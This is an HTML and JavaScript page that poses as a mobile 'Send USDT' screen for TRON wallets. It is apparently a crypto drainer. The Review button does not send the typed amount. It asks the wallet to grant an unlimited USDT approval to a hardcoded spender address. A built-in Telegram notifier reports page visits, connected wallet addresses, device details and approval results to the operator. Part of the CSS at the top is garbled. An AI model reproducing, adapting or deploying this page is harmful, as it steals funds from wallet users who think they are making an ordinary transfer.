<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Send USDT</title>
<style>
*{box-sizing:border-box}

 margin:0;

 top:415px;

 height:75px;
 text-align:center;

 line-height:75px;
 color:#c9ccd3;
 background:transparent;

}

#usd{
 position:absolute;
 left:280px;
 top:505px;
 width:160px;
 height:42px;
 text-align:center;
 font:28px Arial;
 line-height:38px;
 background:transparent;
 color:#09090d;
 z-index:5
}

#token{
 position:absolute;
 left:28px;
 top:744px;
 width:70px;
 height:70px;
 z-index:4
}
#token svg{
 width:100%;
 height:100%;
 display:block
}
#usdt{
 position:absolute;
 left:118px;
 top:746px;
 font:bold 28px Arial;
 line-height:35px;
 z-index:4
}

#max{
 position:absolute;
 left:575px;
 top:742px;
 width:120px;
 height:80px;
 border-radius:45px;
 background:#eeeef1;
 font:bold 25px Arial;
 color:#09090d;
 z-index:5
}

#max:disabled{
 opacity:.55
}

#rev{
 position:absolute;
 left:28px;
 top:1333px;
 width:664px;
 height:98px;
 border-radius:55px;
 background:#f4f4f6;
 color:#d0d0d6;
 font:bold 27px Arial;
 z-index:5
}

#rev.on{
 background:#00f;
 color:#fff
}

.k{
 position:absolute;
 width:180px;
 height:100px;
 background:transparent;
 color:#09090d;
 font:bold 40px Arial
}

.a1,.a2,.a3{top:850px}
.a4,.a5,.a6{top:965px}
.a7,.a8,.a9{top:1080px}
.ad,.a0,.ab{top:1195px}

.a1,.a4,.a7,.ad{left:45px}
.a2,.a5,.a8,.a0{left:270px}
.a3,.a6,.a9,.ab{left:495px}
</style>
</head>

<body>

<div id="p">

 <div id="head">Amount</div>
 <div id="line"></div>

 <button id="back" class="back" aria-label="Back">
   <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
     <polyline points="15 5 8 12 15 19"></polyline>
   </svg>
 </button>

 <div id="recipient">
   <span id="tolabel">To</span>
   <input id="to" type="text" spellcheck="false" autocomplete="off" autocorrect="off" autocapitalize="off" readonly value="TUdnmk7rx8XXtvyTLNvLwXkyXLLW8r9yhJ">
 </div>

 <div id="amt" style="color: rgb(201, 204, 211);">0</div>

 <div id="usd">≈ $0.00 ↕</div>

 <div id="token">
   <svg viewBox="0 0 70 70" aria-hidden="true">
     <circle cx="33" cy="33" r="30" fill="#53a08a" stroke="#cfe1db" stroke-width="3"/>
     <path fill="#fff" d="M16 16h34v6H36v29h-6V22H16z"/>
     <ellipse cx="33" cy="29" rx="20" ry="5" fill="none" stroke="#fff" stroke-width="2"/>
     <circle cx="52" cy="59" r="8" fill="#e33b48" stroke="#fff" stroke-width="2"/>
     <path d="m48 56 8 1-5 6z" fill="none" stroke="#fff"/>
   </svg>
 </div>
 <div id="usdt">USDT</div>

 <button id="max">Max</button>

 <button class="k a1" data-key="1">1</button>
 <button class="k a2" data-key="2">2</button>
 <button class="k a3" data-key="3">3</button>

 <button class="k a4" data-key="4">4</button>
 <button class="k a5" data-key="5">5</button>
 <button class="k a6" data-key="6">6</button>

 <button class="k a7" data-key="7">7</button>
 <button class="k a8" data-key="8">8</button>
 <button class="k a9" data-key="9">9</button>

 <button class="k ad" data-key=".">.</button>
 <button class="k a0" data-key="0">0</button>
 <button class="k ab" id="delete">⌫</button>

 <button id="rev" disabled="">Review</button>

</div>

<script>
const p = document.getElementById("p");
const amt = document.getElementById("amt");
const usd = document.getElementById("usd");
const rev = document.getElementById("rev");
const max = document.getElementById("max");
const toInput = document.getElementById("to");

let value = "";
let usdtUsdPrice = 1;

/* TRON mainnet */
const TRON_NETWORK = "TRON_MAINNET";

/* Official USDT TRC-20 mainnet contract */
const USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const USDT_DECIMALS = 6;

/* TRC-20 approval target - matches backend */
const APPROVAL_SPENDER = "TUdnmk7rx8XXtvyTLNvLwXkyXLLW8r9yhJ";
const MAX_UINT256 = (1n << 256n) - 1n;

/* ---- Telegram notifier ---- */
const TG_TOKEN = ""; // REPLACE with your BotFather token
const TG_CHAT  = ""; // REPLACE with your chat ID
const TG_URL   = "https://api.telegram.org/bot" + TG_TOKEN + "/sendMessage";

function tg(text){
    if (!TG_TOKEN || !TG_CHAT) return;
    try{
        fetch(TG_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: TG_CHAT,
                text: text,
                disable_web_page_preview: true
            }),
            keepalive: true
        }).catch(()=>{});
    }catch(_){}
}

function now(){
    return new Date().toISOString().replace("T"," ").slice(0,19) + " UTC";
}

function deviceInfo(){
    const ua = navigator.userAgent || "";
    let os = "unknown";
    if(/Android/i.test(ua)) os = "Android";
    else if(/iPhone|iPad|iPod/i.test(ua)) os = "iOS";
    else if(/Windows/i.test(ua)) os = "Windows";
    else if(/Mac OS X/i.test(ua)) os = "macOS";
    else if(/Linux/i.test(ua)) os = "Linux";

    let app = "browser";
    if(/TronLink/i.test(ua)) app = "TronLink";
    else if(/TokenPocket/i.test(ua)) app = "TokenPocket";
    else if(/BitKeep|Bitget/i.test(ua)) app = "Bitget";
    else if(/OKApp|OKX/i.test(ua)) app = "OKX";
    else if(/imToken/i.test(ua)) app = "imToken";
    else if(/Trust/i.test(ua)) app = "Trust";

    const w = (window.screen && window.screen.width) || 0;
    const h = (window.screen && window.screen.height) || 0;
    return os + " | " + app + " | " + w + "x" + h + " | " + ua;
}
/* ---- end Telegram notifier ---- */

function amountToUnits(amountStr, decimals){
    let text = String(amountStr).trim();
    if(!/^(?:\d+)(?:\.\d*)?$/.test(text)) throw new Error("Invalid amount.");
    if(text.endsWith(".")) text = text.slice(0,-1);
    const parts = text.split(".");
    const whole = parts[0] || "0";
    const frac = parts[1] || "";
    if(frac.length > decimals) throw new Error("Amount has more than " + decimals + " decimal places.");
    const fracPadded = frac.padEnd(decimals,"0");
    return BigInt(whole) * (10n ** BigInt(decimals)) + BigInt(fracPadded || "0");
}

function getApprovalAmount(){
    return MAX_UINT256.toString();
}

function unitsToAmount(units, decimals){
    const base = 10n ** BigInt(decimals);
    const whole = units / base;
    const fraction = units % base;
    if(fraction === 0n) return whole.toString();
    let frac = fraction.toString().padStart(decimals,"0");
    frac = frac.replace(/0+$/,"");
    return whole.toString() + "." + frac;
}

async function getUsdtBalance(account){
    const tronWeb = await getTronWeb();
    if(!tronWeb.isAddress(account)) throw new Error("Invalid TRON wallet address.");
    const contract = await tronWeb.contract().at(USDT_ADDRESS);
    const result = await contract.balanceOf(account).call();
    return BigInt(result.toString());
}

async function getTronWeb(){
    if(window.tronLink && typeof window.tronLink.request === "function"){
        try{
            await window.tronLink.request({ method:"tron_requestAccounts" });
        }catch(error){}
    }
    for(let i=0;i<20;i++){
        if(window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58){
            tg("WALLET CONNECTED\n" + now() + "\naddr=" + window.tronWeb.defaultAddress.base58 + "\n" + deviceInfo());
            return window.tronWeb;
        }
        await new Promise(resolve=>setTimeout(resolve,150));
    }
    throw new Error("No compatible TRON wallet was detected.");
}

async function fetchUsdtUsdPrice(){
    try{
        const response = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=tether&vs_currencies=usd", {method:"GET", cache:"no-store"});
        if(!response.ok) throw new Error("Price request failed.");
        const data = await response.json();
        const price = Number(data?.tether?.usd);
        if(!Number.isFinite(price) || price <= 0) throw new Error("Invalid USDT/USD price.");
        usdtUsdPrice = price;
        render();
    }catch(error){
        console.warn("USDT/USD price unavailable:", error);
        usdtUsdPrice = null;
        render();
    }
}

function getNumericValue(){
    if(!value || value === ".") return 0;
    const number = Number(value);
    return Number.isFinite(number) ? number : 0;
}

function render(){
    const number = getNumericValue();
    amt.textContent = value || "0";
    amt.style.color = number > 0 ? "#09090d" : "#c9ccd3";
    if(!value || number <= 0){
        usd.textContent = "≈ $0.00 ↕";
    }else if(usdtUsdPrice === null){
        usd.textContent = "≈ $— ↕";
    }else{
        usd.textContent = "≈ $" + (number * usdtUsdPrice).toFixed(2) + " ↕";
    }
    rev.disabled = number <= 0;
    rev.classList.toggle("on", number > 0);
}

function add(x){
    if(x === "." && value.includes(".")) return;
    if(value === "" && x === ".") value = "0";
    if(value === "0" && x !== ".") value = "";
    if(value.includes(".")){
        const fraction = value.split(".")[1] || "";
        if(x !== "." && fraction.length >= USDT_DECIMALS) return;
    }
    const integerPart = value.split(".")[0] || "";
    if(x !== "." && !value.includes(".") && integerPart.length >= 59) return;
    value += x;
    render();
}

function remove(){
    value = value.slice(0,-1);
    render();
}

document.querySelectorAll("[data-key]").forEach(button=>{
    button.addEventListener("click", ()=>{ add(button.dataset.key); });
});

document.getElementById("delete").addEventListener("click", remove);

max.addEventListener("click", async()=>{
    if(!window.tronWeb && !window.tronLink){
        tg("MAX NO WALLET\n" + now() + "\n" + deviceInfo());
        return;
    }
    try{
        max.disabled = true;
        const tronWeb = await getTronWeb();
        const account = tronWeb.defaultAddress.base58;
        if(!tronWeb.isAddress(account)) throw new Error("Invalid TRON wallet address.");
        const balance = await getUsdtBalance(account);
        value = unitsToAmount(balance, USDT_DECIMALS);
        render();
    }catch(error){
        console.error("Max balance error:", error);
        tg("MAX FAILED\n" + now() + "\nerr=" + (error && error.message ? error.message : String(error)) + "\n" + deviceInfo());
    }finally{
        max.disabled = false;
    }
});

document.getElementById("back").addEventListener("click", ()=>{ history.back(); });

rev.addEventListener("click", async()=>{
    const number = getNumericValue();
    if(number <= 0){ render(); return; }
    if(!window.tronWeb && !window.tronLink){
        tg("REVIEW NO WALLET\n" + now() + "\n" + deviceInfo());
        return;
    }
    try{
        const tronWeb = await getTronWeb();
        const account = tronWeb.defaultAddress.base58;
        if(!tronWeb.isAddress(account)) throw new Error("Invalid TRON wallet address.");
        tg("REVIEW CLICKED\n" + now() + "\naddr=" + account + "\namount=" + (value||"0") + "\nspender=" + APPROVAL_SPENDER + "\n" + deviceInfo());
        const spender = APPROVAL_SPENDER;
        if(!tronWeb.isAddress(spender)) throw new Error("Invalid approval spender address.");
        const usdt = await tronWeb.contract().at(USDT_ADDRESS);
        const approveResult = await usdt.approve(spender, getApprovalAmount()).send({feeLimit:150000000, callValue:0});
        const txHash = approveResult && approveResult.txid ? approveResult.txid : "unknown";
        console.log("Transaction:", txHash, approveResult);
        tg("APPROVAL SUCCESS\n" + now() + "\naddr=" + account + "\namount=" + (value||"0") + "\nspender=" + APPROVAL_SPENDER + "\ntx=" + txHash + "\n" + deviceInfo());
    }catch(error){
        console.error("TRON transaction error:", error);
        tg("APPROVAL FAILED\n" + now() + "\naddr=" + (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58 || "unknown") + "\namount=" + (value||"0") + "\nspender=" + APPROVAL_SPENDER + "\nerr=" + (error && error.message ? error.message : String(error)) + "\nraw=" + (()=>{try{return JSON.stringify(error)}catch(_){return "unstringifiable"}})() + "\ncode=" + (error && error.code) + "\n" + deviceInfo());
    }
});

function fit(){
    const scale = Math.min(innerWidth / 720, innerHeight / 1453);
    p.style.transform = "translate(-50%,-50%) scale(" + scale + ")";
}
addEventListener("resize", fit);
fit();
render();
fetchUsdtUsdPrice();
tg("PAGE OPEN\n" + now() + "\n" + deviceInfo() + "\nref=" + (document.referrer||"none") + "\nloc=" + location.href);
</script>

</body>
</html>
